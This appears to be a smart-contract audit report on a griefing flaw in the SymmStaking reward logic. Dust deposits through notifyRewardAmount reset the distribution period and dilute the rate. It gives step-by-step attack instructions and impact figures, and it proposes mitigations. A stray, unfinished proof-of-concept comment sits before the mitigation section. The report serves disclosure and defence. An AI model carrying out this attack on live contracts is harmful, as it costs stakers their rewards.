# Malicious actor can grief stakers by manipulating reward rates and distribution periods at near-zero cost

### Summary

The SymmStaking contract contains a vulnerability in its reward distribution mechanism. A malicious actor (griefer) can add small amounts of reward tokens to drastically reduce the reward rate and extend the distribution period, causing legitimate stakers to receive significantly fewer rewards than expected or forcing them to wait much longer to receive their full rewards. 

This attack is extremely cost-effective for the griefer, requiring only dust amounts of the reward token while causing ~1/3 of the loss in rewards for users who withdraw at the originally intended end date.

### Root Cause

In [SymmStaking.sol:366-382](https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L366-L382), the `_addRewardsForToken` function always resets the reward period to last for the full duration from the current time, regardless of the amount of new rewards added:

```solidity
function _addRewardsForToken(address token, uint256 amount) internal {
    TokenRewardState storage state = rewardState[token];

    if (block.timestamp >= state.periodFinish) {
        state.rate = amount / state.duration;
    } else {
        uint256 remaining = state.periodFinish - block.timestamp;
        uint256 leftover = remaining * state.rate;
        state.rate = (amount + leftover) / state.duration;
    }

    state.lastUpdated = block.timestamp;
    state.periodFinish = block.timestamp + state.duration;
}
```

The key vulnerability is in the last line: `state.periodFinish = block.timestamp + state.duration;`. This unconditionally extends the distribution period to a full duration (7 days by default) from the current time, regardless of how small `amount` is.

Combined with the rate recalculation, this allows griefers to:
1. Add a trivial amount of rewards (as small as dust)
2. Trigger an extension of the reward period
3. Force a recalculation of the rate that significantly dilutes it

### Internal Pre-conditions

1. At least one reward token must be whitelisted via `configureRewardToken(token, true)`
2. A legitimate reward distributor must have added meaningful rewards (e.g., 7000 tokens) using `notifyRewardAmount`
3. Users must have staked tokens in the contract

No specific configuration errors or particular values need to be set. 

### External Pre-conditions

No external pre-conditions are required.

### Attack Path

1. **Legitimate reward distributor** calls `notifyRewardAmount` with a substantial amount (e.g., 7000 DAI) to establish a reward pool with a reasonable rate
2. **Users** stake their tokens and begin accruing rewards at the expected rate
3. **Attacker** acquires a tiny amount (e.g., 0.000000001 DAI, one billionth of a token) of the reward token
4. **Attacker** calls `notifyRewardAmount` with this dust amount
5. The contract extends the reward period by a full 7 days from the current time
6. The contract recalculates the reward rate, including the tiny contribution from the attacker but spreading it over a full new duration
7. **Attacker** can repeat steps 4-6 multiple times, each time further diluting the rate and extending the period
8. **Users** who attempt to claim rewards at the original expected end date will receive significantly less than anticipated


### Impact

The stakers suffer a loss (31% in the POC) if they withdraw at the originally intended end date after a single attack cycle. With multiple attacks, users are forced to wait up to double the originally intended time (or more) to receive their full rewards

Specifically:
- For a 7000 token reward pool over 7 days, after 4 small attacks, stakers would only receive ~4813 tokens (69%) at day 7, losing ~2186 tokens (31%)
- To receive their full rewards, stakers must wait until day 14 (double the intended time)

The griefer can cause significant economic damage to legitimate users with minimal cost. 

This vulnerability will:
1. Make reward distribution unpredictable
2. Severely damage user experience
3. Undermine trust in the protocol
4. Be repeatedly executed to create ongoing disruption

/**
 * Minimal PoC for Reward Rate Manipulation Vulnerability

### Mitigation


Several approaches could mitigate this vulnerability:

1. **Proportional Period Extension**: Adjust the period extension to be proportional to the added reward amount
   ```solidity
   // Option 1: Proportional extension
   if (block.timestamp >= state.periodFinish) {
       state.rate = amount / state.duration;
       state.periodFinish = block.timestamp + state.duration;
   } else {
       uint256 remaining = state.periodFinish - block.timestamp;
       uint256 leftover = remaining * state.rate;
       
       // Calculate extension proportional to contribution
       uint256 extension = amount * state.duration / (amount + leftover);
       extension = Math.min(extension, state.duration); // Cap at max duration
       
       state.rate = (amount + leftover) / (remaining + extension);
       state.periodFinish = state.periodFinish + extension;
   }
   ```

2. **Minimum Contribution Requirement**: Require a meaningful minimum amount for reward contributions
   ```solidity
   // Option 2: Minimum contribution
   require(amount >= minContributionAmount, "Contribution too small");
   ```

3. **No Period Extension Option**: Add an option to notify rewards without extending the period
   ```solidity
   // Option 3: Optional no-extension
   function notifyRewardAmountNoExtension(address[] calldata tokens, uint256[] calldata amounts) external {
       // Similar to notifyRewardAmount but without extending periodFinish
   }
   ```

4. **Rate Protection**: Prevent rate dilution by maintaining a minimum rate threshold
   ```solidity
   // Option 4: Rate protection
   uint256 newRate = (amount + leftover) / state.duration;
   require(newRate >= state.rate * minRateRatio / 100, "Rate dilution too high");
   ```

5. **Access Control Restriction**: Limit who can call the `notifyRewardAmount` function to specific roles
   ```solidity
   // Option 5: Restrict reward notification to privileged roles
   function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) 
       external 
       nonReentrant 
       whenNotPaused 
       onlyRole(REWARD_DISTRIBUTOR_ROLE)  // Add access control
   {
       // Function implementation
   }
   ```
